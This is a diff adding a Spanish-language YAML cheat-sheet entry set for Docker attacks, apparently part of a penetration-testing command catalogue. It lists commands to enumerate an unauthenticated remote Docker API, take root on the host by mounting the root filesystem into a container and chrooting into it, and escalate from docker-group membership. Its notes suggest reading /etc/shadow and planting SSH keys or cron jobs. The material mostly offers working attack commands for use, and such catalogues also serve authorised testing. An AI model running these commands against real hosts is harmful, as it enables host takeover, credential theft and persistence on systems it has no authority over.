@@ -1,0 +1,38 @@
+# Comandos de docker: API remota expuesta y grupo docker.
+tool: docker
+area: pivoting
+url: https://docs.docker.com/reference/cli/docker/
+commands:
+  - id: docker-remote-ps
+    title: Contenedores e imágenes de un Docker remoto
+    cmd: |
+      docker -H tcp://{{RHOST}}:2375 ps -a && docker -H tcp://{{RHOST}}:2375 images
+    phase: enum
+    tags: [docker]
+    notes: >-
+      Con la API sin TLS, tu cliente de docker manda en el demonio remoto igual que en el tuyo. Las
+      imágenes que ya tiene son las que podrás arrancar sin descargar nada.
+    refs: [https://docs.docker.com/engine/security/protect-access/]
+
+  - id: docker-remote-host-root
+    title: Root en el host desde una API de Docker expuesta
+    cmd: |
+      docker -H tcp://{{RHOST}}:2375 run --rm -it -v /:/host alpine chroot /host sh
+    phase: initial-access
+    tags: [docker]
+    notes: >-
+      Monta la raíz del host en un contenedor y entra en ella como root: lees /etc/shadow, escribes
+      claves SSH o un cron. Cambia alpine por una imagen que ya exista si el host no sale a internet.
+    refs: [https://docs.docker.com/engine/security/#docker-daemon-attack-surface]
+
+  - id: docker-group-privesc
+    title: Root desde el grupo docker
+    cmd: |
+      docker run --rm -it -v /:/host alpine chroot /host sh
+    phase: privesc
+    area: privesc-linux
+    tags: [docker]
+    notes: >-
+      Estar en el grupo docker (id lo dice) equivale a ser root: el demonio corre como root y monta lo
+      que le pidas. Lo mismo con el socket /var/run/docker.sock escribible.
+    refs: [https://docs.docker.com/engine/security/#docker-daemon-attack-surface]
